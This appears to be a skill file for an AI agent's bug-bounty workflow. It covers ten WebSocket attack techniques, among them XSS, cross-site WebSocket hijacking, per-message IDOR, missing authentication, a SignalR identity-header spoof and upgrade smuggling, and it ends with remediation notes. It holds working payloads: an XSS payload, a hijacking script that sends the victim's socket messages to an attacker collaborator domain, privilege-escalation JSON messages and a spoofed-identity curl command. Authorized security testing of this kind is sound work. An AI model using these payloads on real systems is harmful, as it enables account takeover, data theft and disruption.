---
name: websocket-security-testing
description: WebSocket security testing — XSS via WebSocket messages/handshakes, Cross-Site WebSocket Hijacking (CSWSH), per-message authorization bypass/IDOR, missing authentication, hidden/undocumented actions, and resource-exhaustion via oversized/flooded payloads (authorized testing only). Use this during Phase 3 (Vulnerability Testing — Client-side/Auth/Access-control/Availability) of bughunting-workflow whenever the target uses WebSockets (chat, live updates, trading/gaming feeds, notifications — anything with a `ws://`/`wss://` connection or an HTTP 101 Switching Protocols handshake). Also trigger on mentions of WebSocket, wss://, CSWSH, Sec-WebSocket-Key, wscat, or real-time/bi-directional connections.
---

# WebSocket Security Testing

General technique library for WebSocket vulnerabilities. Add new dated entries below as more WebSocket writeups are processed, rather than creating a new skill.

## Core theory

A WebSocket connection starts as a normal HTTP request that gets upgraded (`101 Switching Protocols`):
```
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
Server response:
```
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
Key point: the handshake is just an HTTP request — it inherits cookies automatically like any other HTTP request, but browsers do **not** enforce same-origin policy or CSRF protections on it the way they do for normal AJAX/fetch requests. If the app relies solely on the cookie for session identification during this handshake (no CSRF token, no other unpredictable per-request value), any page on the internet can open a WebSocket to it and it will authenticate as the victim.

## Where to look (recon signal)

Any feature using real-time/bi-directional updates: live chat, notifications, trading/gaming feeds, collaborative editing, live dashboards. Watch network traffic for a `101 Switching Protocols` response or a `wss://`/`ws://` connection in the browser devtools/Burp's WS history.

## Technique 1 — XSS via WebSocket messages

WebSocket messages are just another user-controlled input channel — if the app renders received message content into the DOM without sanitizing, standard XSS applies.

**Test:** intercept an outgoing WebSocket message (e.g. a chat message) and replace its content with a simple payload: `<img src=x onerror=alert(12)>`. If the receiving client renders it unsanitized, the popup fires.

**Client-side-sanitization bypass:** if typing the payload directly into the app's UI gets it encoded/stripped before it's sent, that's client-side sanitization only — it doesn't mean the server is safe. Submit the payload normally through the UI first (so you see how it gets mangled), then use Burp's WebSocket interception to catch the outgoing frame *before* it leaves the browser and edit the raw `content` field in the frame directly, bypassing whatever JS-side encoding the client applied. Forward it as-is. If the server reflects it to other users without its own sanitization, the payload fires in their browser even though the UI itself appeared to block it — this is worth explicitly calling out in the report as "client-side-only sanitization, no server-side validation," since it's a distinct (worse) finding than a simple missed-encoding bug.

**Bypass note:** if the app detects/blocks the payload at the handshake level (e.g. IP gets blocked, "attack detected"), don't give up on the handshake — reconnect and try adding an `X-Forwarded-For` header on the new handshake request (can bypass naive IP-based blocking), and try alternate/obfuscated ("script kiddie") payload encodings alongside it. Both manipulating the live message stream and manipulating the handshake itself are separate attack surfaces worth testing independently.

**General principle worth remembering:** WebSocket traffic is a delivery channel, not a vulnerability class of its own — any vulnerability you'd test for over HTTP (XSS, injection, IDOR, etc.) can potentially be delivered or triggered over a WS connection too. When testing a WS-heavy target, don't treat this skill as the complete list — cross-reference other topic skills (e.g. injection classes) against whatever data the WS messages carry.

## Technique 2 — Cross-Site WebSocket Hijacking (CSWSH)

This is a CSRF vulnerability applied to the WebSocket handshake. Impact: perform actions as the victim, or read back any data the server sends over the socket (which is effectively "sensitive data the victim can access").

**How to test:**
1. Review the app's WebSocket handshake request (via Burp or devtools). Check whether it authenticates purely via the `Cookie` header with **no CSRF token or other unpredictable value** in the handshake itself.
2. Check the session cookie's `SameSite` attribute — `SameSite=None` (or missing on an older browser target) means the cookie rides along on a cross-site WebSocket handshake.
3. Check whether the server validates the `Origin` header on the handshake against an allowlist. Origin-header validation is the primary server-side defense against CSWSH (a WebSocket handshake can't carry a custom CSRF-token header the way fetch/XHR can, so `Origin` checking is what most secure implementations rely on) — if it's absent, that alone is often enough to confirm the finding even without checking cookie attributes.
4. If either check fails (no CSRF token/unpredictable value AND no Origin validation), the handshake is forgeable cross-site.

**Exploit (host this on an attacker page, get the victim to open it):**
```html
<script>
var ws = new WebSocket('wss://target.example.com/chat');
ws.onopen = function() {
    ws.send("READY");
};
ws.onmessage = function(event) {
    fetch('https://<attacker-collaborator-domain>', {method: 'POST', mode: 'no-cors', body: event.data});
};
</script>
```
This opens a WebSocket to the target *as the victim* (browser attaches their session cookie automatically), triggers whatever the app sends on connect, and exfiltrates every message received to an attacker-controlled endpoint (use a Burp Collaborator / oastify-style out-of-band domain to catch it blind).

CSWSH isn't limited to reading data back — if the app accepts state-changing actions over the same connection, send one directly in `onopen` instead of just reading responses, e.g. `ws.send(JSON.stringify({"action":"transferFunds","to":"attacker","amount":500}))`. A successful state-changing action (funds transfer, role change, data modification) executed purely from the victim opening an attacker page is a much stronger, higher-severity proof of impact than passive data exfiltration alone.

## Technique 3 — Per-message authorization bypass (IDOR over WebSocket)

Root cause (quoted from source): *"Authentication is only checked during handshake. But authorization is not checked per message or channel."* Many apps validate identity once at the handshake, then trust every subsequent message on that connection without re-checking whether the authenticated user is actually *allowed* to do what the message asks. This is IDOR/broken access control, just carried over a WS connection instead of separate HTTP requests.

**How to test:**
1. Capture the handshake in Burp (WebSocket history) or `wscat -c wss://target.com/socket` and confirm you're authenticated as a normal/low-privilege user.
2. Observe legitimate message structure by using the app normally — look for object/user/channel IDs in the JSON, e.g. `{"action":"subscribe","channel":"user_123"}`.
3. Modify the ID/channel to something that isn't yours and resend over the same authenticated connection:
   - `{"action":"subscribe","channel":"user_456"}` or `{"action":"subscribe","channel":"admin_notifications"}` — channel/subscription IDOR
   - `{"action":"get_profile","user_id":999}` — object-level IDOR, enumerate sequential IDs
   - `{"action":"approve_user","user_id":789}` or `{"action":"set_role","role":"admin"}` — privileged-action test, checks whether the server enforces role/permission on the *action* itself, not just on who's connected
   - `{"action":"updateRole","userId":<your own id>,"role":"admin"}` — role/privilege escalation targeting your own account specifically (as opposed to acting on someone else's) — a distinct, often-missed check since some apps validate "can this user touch this target ID" but forget to validate "is this user allowed to grant themselves this role"
4. Since the connection already passed authentication, none of these follow-up messages need new credentials — that's exactly the bug being tested for. A response that returns another user's data, or a privileged action that silently succeeds, confirms missing per-message authorization.

**Tools:** Burp Suite (WS history tab + Repeater works on WS messages too), browser DevTools Network tab filtered to "WS", and `wscat` for quick CLI probing outside the browser.

**Impact framing for report:** push past "I can subscribe to another channel" — demonstrate concretely what that gets you: cross-user data leakage, private messages, trading/financial data exposure, admin panel access, or leaked API keys/tokens read off another user's channel. Also worth noting: this bypass happens *silently* at the WS layer, often without hitting normal API-layer logging/WAF rules that would catch the equivalent over plain HTTP — call that out, it strengthens severity. Suggested report title from the source: "WebSocket Authorization Bypass Allows Access to Unauthorized Channels."

## Technique 4 — Missing authentication entirely

Some WebSocket endpoints skip authentication altogether — the server processes any message from any connection, authenticated or not.

**How to test:** open a raw WebSocket connection with no auth token/cookie/header at all (`wscat -c wss://target.com/socket` with nothing else set, or strip the `Authorization`/`Cookie` from the handshake in Burp before it's sent) and send a normal-looking action, e.g. `{"action":"getBalance","userId":42}`. If you get real data back (`{"balance": 12900.50, "currency":"USD"}`) without ever having authenticated, that's a complete auth bypass — often more severe than a per-message authorization gap (Technique 3) since it doesn't even require a valid account to begin with.

## Technique 5 — Hidden/undocumented actions

WebSocket APIs are typically undocumented (no Swagger/OpenAPI-equivalent that hunters are used to checking for REST), which makes it easy for debug/admin actions to ship to production unprotected and unnoticed.

**How to test:** enumerate plausible action names beyond what the UI actually sends — `debugMode`, `admin`, `status`, `healthcheck`, `getConfig`, `listUsers`, and similar administrative/diagnostic-sounding verbs — and send them over an authenticated (or even unauthenticated, per Technique 4) connection: `{"action":"debugMode","enable":true}`. Watch for verbose responses, stack traces, or a success status (`{"status":"ok","debugMode":"enabled"}`) that reveals the action exists and executed. Burp Suite or OWASP ZAP can help by diffing/logging responses across a wordlist of guessed action names rather than trying them one at a time by hand.

## Technique 6 — Resource exhaustion via oversized/flooded payloads

Applies only to targets where you have explicit authorization to perform availability/load testing (most bug bounty programs scope this separately or exclude it — check program rules before attempting; this is not for use against systems without permission).

**Where it applies:** WS endpoints with no message-size cap and no per-connection rate limiting. Root cause: the server accepts and processes whatever size/frequency of message arrives, with no input-length validation or throttling.

**How to test (only within program scope):** send a single oversized message, e.g. `{"action":"sendMessage","message":"A".repeat(1000000)}`, and separately test rapid repeated sends, watching for memory/CPU degradation or an unhandled error rather than a clean `{"error":"Payload too large"}` rejection. A vulnerable server either crashes, hangs, or shows no protective response at all.

## Technique 7 — Trusted client-supplied identity header on the negotiate/handshake endpoint (SignalR/Azure Function)

Distinct from Technique 4 (no auth at all) — here the backend *does* issue a real, validly-signed token, but it trusts a client-controlled HTTP header to decide *whose* identity that token represents, completely bypassing the enterprise SSO (Azure AD) flow that should be the only source of truth. Root cause: a custom HTTP client built for local dev testing "inject[ed] the user's ID into the negotiate request as an HTTP header" (`x-ms-client-userid`) as a convenience shortcut, and that shortcut shipped to production without ever being gated behind an environment check.

**Discovery path:** this bug is invisible from the REST surface — standard endpoints 404. It was found by pulling a production `.js.map` source map (see `recon-scanning-toolkit`'s source-map-exploitation technique) off a React SPA, which revealed the unminified backend logic including the custom `MyHttpClient` class and its negotiate-header injection, plus the backend Azure Function hostnames (`func-backend-live-*.azurewebsites.net`) that weren't referenced anywhere in the minified bundle alone. This is a concrete worked example of "investigate non-standard transport layers (WebSockets, SignalR, SSE, GraphQL) when REST proves inaccessible" — the real API surface only existed inside the SPA's WebSocket/SignalR negotiation code.

**How to test:**
1. Pull every `.js.map` off the target SPA and grep the recovered source for any custom networking/HTTP-client wrapper class — not the framework's default fetch/axios call, a bespoke one. Bespoke auth-adjacent wrappers are exactly where "dev convenience" shortcuts like this live.
2. Read the wrapper for any header it sets that looks identity-related (`x-ms-client-userid`, `x-user-id`, `x-impersonate`, `x-debug-user`, anything prefixed `x-` naming a user/account/tenant).
3. Send the `/negotiate` (or equivalent connection-initiation) request directly with that header set to an arbitrary ID, with **no valid session/SSO token at all**:
```
curl -X POST -H "x-ms-client-userid: 11111111-1111-1111-1111-111111111111" \
  https://func-backend-live-api.azurewebsites.net/api/v1/negotiate
```
4. If the server returns a valid, signed connection token/JWT with that spoofed ID embedded in its claims (e.g. `"asrs.s.uid": "11111111-..."`), authentication has been bypassed entirely — the backend never validated the header against an actual Azure AD/SSO session.
5. Confirm full impact by completing the WebSocket/SignalR handshake with the stolen token (Python `websockets` library or `wscat`), sending the protocol handshake frame (`{"protocol":"json","version":1}\x1e`) and confirming the `{"type":6}` ack — proves you're now a live, authenticated connection as an arbitrary user, not just holding a token.

**Impact:** complete authentication bypass for the entire application — any unauthenticated attacker can impersonate any organizational user by guessing/enumerating their ID (often a predictable GUID or email-derived value), with real-time data interception, message manipulation, and backend method invocation all in scope once connected.

**Generalize:** any time an app layers a real-time/WebSocket transport (SignalR, Socket.IO, Pusher, Ably, raw WS) on top of an SSO/enterprise-auth system, check specifically whether the *connection-negotiation* endpoint independently re-validates identity against the SSO token, or whether it trusts some side-channel value (header, query param, cookie) that a client could set to any value it wants. SSO correctness on the main app doesn't guarantee the negotiate endpoint inherited the same trust boundary.

## Technique 8 — socket.io/SignalR namespace & room authorization bypass via raw Engine.IO packets

Distinct from Technique 3's generic channel-ID IDOR: socket.io apps often gate access to a privileged namespace (e.g. `/admin`) at the *connection-URL* level in client code (`io("/admin")`), while the actual authorization check server-side is weak or absent — the namespace string itself isn't a security boundary unless the server explicitly re-validates it.

**How to test:**
1. Fingerprint the Engine.IO version first by probing the polling transport (`GET /socket.io/?EIO=4&transport=polling`) — payload framing differs across major versions, so get this right before crafting raw packets.
2. Instead of relying on the client SDK's namespace parameter, send the raw Engine.IO `CONNECT` packet for the target namespace directly over the WebSocket connection once the handshake/upgrade completes: `40/admin,` (packet type `4` = message, `0` = CONNECT, `/admin,` = target namespace with trailing comma).
3. Watch for `42` packets (type `4` = message, `2` = EVENT) arriving afterward that contain data scoped to the privileged namespace or another user's room — their presence confirms the server accepted the namespace switch without an authorization check.
4. Apply the same raw-packet approach to room-joins if the app uses rooms within a namespace rather than (or in addition to) separate namespaces — send a raw join event for a room ID that isn't yours and watch for room-scoped broadcast data arriving on your connection.

**Why raw packets instead of the client SDK:** some apps gate the namespace parameter client-side (the SDK's `io()` call only offers namespaces the UI exposes) — crafting the raw Engine.IO frame bypasses that client-side gate entirely and tests what the server actually enforces, the same "client-side filtering isn't server-side validation" principle as Technique 1's sanitization-bypass note.

## Technique 9 — Handshake-layer upgrade smuggling

A request-smuggling variant specific to the WebSocket upgrade handshake: since the handshake starts as a normal HTTP request, a front-end proxy/CDN and the backend origin can disagree about whether a given request is a genuine upgrade or an ordinary HTTP request, the same root cause as classic HTTP request smuggling but triggered through upgrade-specific headers instead of `Content-Length`/`Transfer-Encoding`.

**How to test:**
1. Vary the handshake's upgrade-specific headers in ways that are individually plausible but create proxy/origin interpretation divergence — mismatched or duplicate `Sec-WebSocket-Version`, conflicting/duplicate `Connection` header values (`Connection: keep-alive, Upgrade` vs. just `Connection: Upgrade`), or an unexpected `Upgrade` header value alongside a technically-valid `101`-eligible request.
2. Send these variants and look for a status-code/behavior split between what the front-end proxy appears to have decided (e.g. it forwards the request as a plain HTTP request) and what the backend does with it (treats it as an upgrade, or vice versa) — this split is the signal a smuggling tunnel exists.
3. Confirm impact via timing probes (a smuggled request sitting in the backend's buffer measurably delays the *next* legitimate request on the same connection) and Burp Collaborator/OAST markers injected into the smuggled portion, the same confirmation methodology as any other request-smuggling finding.

**Tooling:** Burp's **HTTP Request Smuggler** extension — it already understands desync detection patterns and can be pointed at upgrade requests, rather than hand-crafting every header permutation manually.

**Generalize:** this is HTTP request smuggling (an existing vuln class) applied specifically to the upgrade/101 handshake rather than a wholly new mechanism — if request smuggling is already in scope for a target, always include the WebSocket upgrade endpoints in that testing pass rather than treating them as a separate surface.

## Technique 10 — Replay & state-machine bypass

Applies to WS protocols that use signed/authenticated messages (a message carries a signature or a server-issued token proving it was legitimately sent) but don't additionally bind that signature to freshness or sequence.

**Root cause:** a signed message is valid proof of *authorship* at the moment it was created, but without a nonce/timestamp/sequence-number check tied to the session, a captured valid message can be replayed later, or messages can be sent out of the order the application's own state machine expects (e.g. a `"confirmOrder"` message replayed after the order was already cancelled, or a multi-step flow's step-3 message sent before step-2 completed).

**How to test:**
1. Capture a legitimate signed/authenticated message mid-session (Burp WS history).
2. Replay it later in the same session (or, if session binding is also missing, in a different session entirely) and check whether the server re-processes it as if freshly sent — a state-changing effect firing twice (double-spend-shaped) confirms missing freshness validation.
3. Separately, try sending messages that are individually valid but out of the sequence the application's state machine expects (skip a step, repeat a step, send a "later" step first) and check whether the server enforces the expected order or processes whatever arrives.

**Generalize:** this is the WebSocket-transport version of `race-condition-testing`'s TOCTOU/double-spend concerns and `crlf-injection-testing`'s broader "don't just check content, check sequence/timing too" discipline — a message-level analogue to replay attacks on signed HTTP requests/JWTs.

## Remediation notes (for reports / retesting a fix)

- App should use `wss://` (TLS) — not a vuln by itself but table stakes.
- WebSocket endpoint URL should be hardcoded server-side, never built from user-controllable input.
- Handshake must be protected against CSRF — a token or other unpredictable value tied to the session, checked server-side before completing the upgrade.
- Treat all data received over the socket as untrusted in **both directions** — sanitize on render (client) and validate on receipt (server), since raw WS messages can carry injection payloads (XSS, SQLi-equivalent if the message content reaches a query) just like any other input channel.
- Authorization must be checked **per message/action/channel**, not only once at handshake — re-verify the authenticated user's permission for every privileged action or object/channel ID referenced in a message, the same way you would for each individual REST endpoint.
- Require and validate authentication on every message, not just presence of a connection — an open connection should not itself imply trust.
- Remove or gate debug/admin actions before production; prefer an explicit allowlist of valid actions over trusting that undocumented ones won't be found.
- Validate the `Origin` header against an allowlist on the handshake, in addition to (not instead of) CSRF-token/SameSite protections.
- Enforce message size limits and per-connection rate limiting to prevent resource exhaustion.
- General framing worth using verbatim in a report's intro/remediation section: "treat WebSockets like any other API endpoint — authenticate, authorize, validate, and monitor."

## Chaining

Apply during **Phase 3 (Vulnerability Testing)** of `bughunting-workflow`, under Client-side (XSS via message content) and Auth (CSWSH is a session/CSRF-class issue). Flag any target using WebSockets during Phase 1/2 recon as a priority for this technique — it's an easily-missed surface since most generic scanners don't fuzz WS traffic.

## Source

- [WebSockets Security Vulnerabilities](https://medium.com/@shahzaiblang2842/websockets-security-vulnerabilities-87f464b23138) by Muhammad Shahzaib, Medium — processed 2026-09-22 (WebFetch 403'd, fetched via Chrome fallback). Covers Technique 1 & 2.
- [WebSocket Authorization Bypass Vulnerability Leads To...](https://medium.com/bugbountywriteup/6-websocket-authorization-bypass-vulnerability-leads-to-7dd3aa376558) — processed 2026-09-22 via freedium mirror (WebFetch succeeded directly on the mirror URL). Covers Technique 3.
- [Exploiting Insecure WebSocket Communication](https://medium.com/@gupta-bless/exploiting-insecure-websocket-communication-90554f5e43fe) — processed 2026-09-22 via freedium mirror (WebFetch succeeded directly). Added the client-side-sanitization-bypass refinement to Technique 1.
- [Hacking APIs: Exploiting WebSockets Insecure Implementations](https://medium.com/@iaraoz/hacking-apis-exploiting-websockets-insecure-implementations-a69cba59b0ad) — processed 2026-09-22 via freedium mirror (WebFetch succeeded directly). Refined Technique 2 (Origin header, state-changing exploit) and Technique 3 (self-role-escalation payload); added Technique 4 (missing auth), Technique 5 (hidden actions), Technique 6 (resource exhaustion).
- [Bypassing Enterprise SSO via a Forgotten Source Map — A Bug Bounty Story](https://medium.com/bugbountywriteup/bypassing-enterprise-sso-via-a-forgotten-source-map-a-bug-bounty-story-a43ab0973146) — processed 2026-10-01 via freedium mirror (WebFetch succeeded directly). Added Technique 7 (trusted client-supplied identity header on SignalR/Azure Function negotiate endpoint, discovered via exposed source map).
- [elementalsouls/Claude-BugHunter — skills/hunt-websocket/SKILL.md](https://github.com/elementalsouls/Claude-BugHunter/blob/main/skills/hunt-websocket/SKILL.md) — third-party GitHub skill file (not Medium, not logged in `loxs-medium`), processed 2026-10-01 via WebFetch. Added Technique 8 (socket.io/SignalR namespace & room bypass via raw Engine.IO CONNECT packets), Technique 9 (handshake-layer upgrade smuggling), Technique 10 (replay & state-machine bypass).

<!-- Add new recorded techniques below this line as new WebSocket writeups are processed. -->
